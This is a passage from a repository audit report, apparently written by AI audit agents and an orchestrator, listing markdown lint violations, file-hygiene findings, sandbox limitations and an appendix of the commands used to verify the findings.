**Evidence:** Step says "Open `harness.manifest.yaml`. The modules listed there are the *only* governance overlays in force." No command. For Claude Code that's fine; for Cursor/Copilot/Gemini reading the same `AGENTS.md` as cross-agent contract, the semantics differ. The step also doesn't tell the agent to validate-before-proceeding.
**Recommendation:** Tighten step 2 to "Open and validate `harness.manifest.yaml`: read it, then run `validate-manifest.sh` to confirm parseable structure."

### Lane 5 — Lint + file hygiene

#### Finding L5-01: MD060 (`table-column-style`) — 68 violations across entry-point and workflow markdown — Severity: medium

**Where:** orchestrator-verified `markdownlint-cli2 v0.22.1` (markdownlint v0.40.0) against `README.md`, `HARNESS.md`, `AGENTS.md`, `CLAUDE.md`, `SUMMARY.md`, `TOOLS.md`, `platform/workflow/*.md`, `platform/README.md`.
**Evidence:** **MD060 is a real rule** in markdownlint v0.40.0 — it is `MD060/table-column-style` (alias `table-column-style`), about consistent pipe-spacing in tables. The Lane 5 agent's report that "MD060 doesn't exist" was incorrect (their sandbox blocked WebFetch and they assumed the docs URL was 404; the URL returns 200 and the file exists). Real hit counts:

- **MD013 (line-length): 736** — likely noise, consider disabling or raising limit
- **MD060 (table-column-style): 68** — user's flagged rule
- **MD040 (no-language-in-fence): 7**
- **MD034 (no-bare-urls): 5**
- **MD022 (blanks-around-headings): 4** — confirmed install.sh agent's original mention
- **MD056 (table-column-count): 1**

The 68 MD060 hits are concentrated in tables where pipes don't have consistent left/right spacing.
**Recommendation:** Add a `.markdownlint.json` at repo root with: `{"MD013": false, "MD060": {"style": "compact"}}` (or `"leading_and_trailing"` if you prefer the canonical style — pick one and apply repo-wide). Wire `markdownlint-cli2` into CI as a new step.

#### Finding L5-02: MD022 — H1 directly followed by H2 with no blank line — Severity: medium

**Where:** `platform/workflow/ci-integration.md:7-8`, `platform/workflow/discovery-to-composition.md:7-8`, `platform/workflow/brownfield-onboarding.md:7-8`, `platform/examples/composed-entrypoints/HARNESS.md:7-8`, `platform/examples/composed-entrypoints/CLAUDE.md:7-8`.
**Evidence:** Consistent pattern after the SPDX header HTML comment: line 7 is `# Title`, line 8 is `## Subtitle`. The pattern is identical enough across these 5 files to suggest a shared template.
**Recommendation:** Insert blank line between H1 and H2 in each, or drop the immediate H2 entirely (the H1 + first paragraph reads more naturally).

#### Finding L5-03: MD031 — fenced code blocks not preceded by blank line — Severity: medium

**Where:** `platform/skills/harness-testing/SKILL.md:103,110,127,132,144` (5 hits); `docs/superpowers/plans/2026-05-12-opportunity-capture-module.md:460,477,494` (3 hits).
**Evidence:** Pattern `[non-blank-text]\n\`\`\`lang` with no intervening blank.
**Recommendation:** Insert blank line between prose lead-in and opening fence.

#### Finding L5-04: MD034 — bare URLs in tables and prose — Severity: medium

**Where:** ~30 violations across 11 files; concentrated in MCP/agentic reference tables: `platform/templates/mcp/transport-and-auth.md:228-233` (6), `platform/templates/mcp/risk-register.md:205-208` (4), `platform/workflow/mcp-server-build.md:256-260` (5), `platform/skills/harness-mcp/SKILL.md:195-198` (4), `platform/examples/sample-projects/mcp-server-starter/docs/mcp/*.md` (~10).
**Evidence:** Reference tables like `| MCP Inspector | https://github.com/modelcontextprotocol/inspector |` use bare URLs.
**Recommendation:** Wrap as `<https://...>` (autolink) or `[Label](https://...)`. Autolink is the lowest-effort fix.

#### Finding L5-05: MD040 — fenced code blocks without language tag — Severity: medium

**Where:** ~16 unlabeled opening fences across 11 files. Top contributors: `platform/workflow/agentic-interface-integration.md` (4), `platform/bootstrap/README.md` (2), `platform/examples/sample-projects/submodule-consumer/README.md` (2).
**Evidence:** 231 total `\`\`\`` lines vs 201 `\`\`\`lang` lines.
**Recommendation:** Add explicit language to every opening fence. Use `text` for prose excerpts, `bash` for shell, `markdown` for inline-markdown samples.

#### Finding L5-06: No `.editorconfig` at repo root — Severity: medium

**Where:** repo root.
**Evidence:** Lane 5 confirmed the repo's existing state is already consistent (LF, no trailing whitespace, spaces over tabs) — but no machine-readable contract pins this. A contributor's IDE could silently start emitting CRLF or tabs.
**Recommendation:** Add `.editorconfig` capturing the convention. Lane 5 supplied a minimal starter (see its report).

#### Finding L5-07: One test-fixture `.sh` lacks executable bit — Severity: low

**Where:** `platform/validators/test/fixtures/projects/valid-doc-references/platform/foo/script.sh`.
**Evidence:** All other 12 `.sh` files have the `u+x` bit. This one is non-executable; likely intentional as a fixture scaffold but worth confirming with the test author.
**Recommendation:** Add an inline comment in the fixture explaining the intentional non-executability, or `chmod +x` it.

#### Finding L5-08 (informational): SKILL.md frontmatter inconsistent quoting style — Severity: low

**Where:** All 7 `platform/skills/*/SKILL.md`.
**Evidence:** Frontmatter shape consistent. Quoting of `description` varies (single, double, unquoted). YAML accepts all three.
**Recommendation:** Optional polish — pick one quoting style for `description` and apply across all 7. Not a real lint issue.

---

## Methodology limitations

Five audit agents ran in isolated worktrees. Their sandbox blocked several useful commands:

- **`curl`** and **`gh`** were denied for Lane 1, 3, and 4 agents — external URL link-health and GitHub repo hardening checks couldn't be performed in-lane. Orchestrator filled the gap from the parent session.
- **`npm install`** / **`gem install`** were denied for Lane 5 — the agent built a hand-rolled grep/PCRE emulation of markdownlint, which got most things right but mis-concluded that MD060 didn't exist. Orchestrator installed `markdownlint-cli2 v0.22.1 (markdownlint v0.40.0)` and re-ran; the 68-hit MD060 count is from that real run.
- **`shellcheck`** install was denied for Lane 2 — Lane 2 used manual inspection. Shellcheck is also not installed in the orchestrator's local dev environment; the finding L2-03 recommendation still stands and the agent's manual SC2086 spotting at `install.sh:540` is the seed for what shellcheck would catch.
- **`mkdir /tmp/...`** / **`git init`** were denied for Lane 4 — the agent couldn't actually walk the bootstrap flow end-to-end; their findings are doc-reading-based. Orchestrator's verifications of L4-01, L4-04, L4-08 confirm the agent's reads were accurate.

Future runs should grant audit-lane sandboxes the network + lint-install + scratch-dir permissions explicitly via `allowedPrompts` at dispatch time.

## Verification appendix

| Finding | Verified by orchestrator? | How |
|---|---|---|
| L1-02 maturity claim | yes | `sed -n '11,16p' platform/README.md` confirmed `Version: Beta (April 2026)` |
| L1-03 skill count | yes | `ls -d platform/skills/*/` returned 7 dirs |
| L1-04 validator count | yes | `ls platform/validators/*.sh` returned 7 files |
| L1-05 YOUR-ORG | yes | `grep -n 'YOUR-ORG' README.md platform/workflow/*.md` returned 3 hits |
| L1-06 how-to-read counts | yes | sed-read confirmed "24 modules, 35 templates, 6 validators, 4 skills" |
| L1-15 URL health | yes | sample of 11 external URLs all returned 200 (incl. agents.md, copilotkit, a2ui, modelcontextprotocol, etc.) |
| L2-04 NoMethodError leak | yes | `echo '' \| xargs bash validate-manifest.sh` produced raw Ruby stack trace |
| L3-04 repo hardening | yes | `gh api .../branches/main/protection` returned 404; secret_scanning suite all `disabled` |
| L4-01 broken command | yes | README:148 missing project-root arg confirmed |
| L4-03 --help crashes | yes | every `validate-X.sh --help` reproduced (Ruby stack trace from harness_registry.rb:19) |
| L4-04 missing compositions | yes | `ls platform/compositions/*.yaml` showed 9; README table shows 8 — `interview-driven-discovery.yaml` + `mcp-server-typescript.yaml` missing |
| L4-08 sample manifest dup | yes | `diff` between the two manifests returned empty |
| L5-01 MD060 hit count | yes | `markdownlint-cli2 v0.22.1` against entry-point + workflow markdown returned 68 MD060 hits |

## Tooling versions used

- `markdownlint-cli2` v0.22.1 (markdownlint v0.40.0)
- `gh` (orchestrator's local install — version not pinned to audit)
- `curl` 8.x (system)
- `git` 2.39+ (orchestrator)
- `bash` 5.2.x (orchestrator); Lane 2 used file inspection; `shellcheck` not installed
